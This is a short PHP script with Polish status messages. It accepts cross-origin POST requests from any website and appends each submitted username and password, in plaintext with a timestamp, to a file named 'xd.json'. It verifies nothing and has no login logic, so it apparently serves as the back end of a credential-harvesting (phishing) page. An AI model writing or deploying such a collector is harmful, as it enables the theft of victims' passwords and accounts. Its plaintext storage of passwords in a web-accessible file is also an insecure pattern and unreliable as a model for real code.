<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: Content-Type");
header("Content-Type: application/json; charset=UTF-8");

$raw_input = file_get_contents('php://input');
$request_method = $_SERVER['REQUEST_METHOD'];

if ($request_method === 'POST') {
    $data = json_decode($raw_input, true);

    if (!$data) {
        http_response_code(400);
        echo json_encode(["status" => "error", "message" => "Nieprawidłowy JSON"]);
        exit;
    }

    $username = isset($data['username']) ? trim($data['username']) : 'Nieznany';
    $password = isset($data['password']) ? trim($data['password']) : '';


    if (!empty($password)) {
        $filename = 'xd.json';

        $current_data = [];
        if (file_exists($filename)) {
            $file_content = file_get_contents($filename);
            $decoded = json_decode($file_content, true);
            if (is_array($decoded)) {
                $current_data = $decoded;
            }
        }

        $current_data[] = [
            "password" => $password,
            "username" => $username,
            "timestamp" => date('Y-m-d H:i:s')
        ];

        file_put_contents($filename, json_encode($current_data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

        echo json_encode(["status" => "ok", "message" => "Zapisano pomyślnie"]);
        exit;
    }
}

http_response_code(400);
echo json_encode(["status" => "error", "message" => "Brak wymaganych danych (password)"]);
?>